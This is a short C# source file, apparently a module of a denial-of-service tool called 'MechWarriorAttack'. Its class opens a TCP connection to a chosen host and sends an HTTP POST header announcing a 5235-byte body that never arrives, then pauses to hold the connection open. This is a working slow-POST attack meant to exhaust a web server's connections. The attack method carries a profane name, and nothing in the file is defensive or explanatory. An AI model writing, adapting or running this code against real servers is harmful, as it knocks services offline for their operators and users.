using MechWarrior;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace MechWarriorAttack
{
   public class SlowWiggie : MechState, IDisposable
    {
        public SlowWiggie(string Host, int port, int pauseTime )
        {
            Site = Host;
            Port = port;
            PauseTime= pauseTime;
            TClient= new TcpClient();
        }

        public string Site { get; }
        public int Port { get; }
        public int PauseTime { get; }
        public TcpClient TClient { get; }

        public void Dispose()
        {
            try
            {
                TClient.GetStream().Dispose();

            }
            catch (Exception)
            {
                
            }
        }

        public override bool FuckEmThatsWhy()
        {
            try
            {
                TClient.Connect(Site, Port);
                StreamWriter writer = new StreamWriter(TClient.GetStream());
                writer.Write("POST / HTTP/1.1\r\nHost: " + Site + "\r\nContent-length: 5235\r\n\r\n");
                writer.Flush();
                if(PauseTime > 0)
                {
                    Thread.Sleep(PauseTime);
                }
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }
    }
}
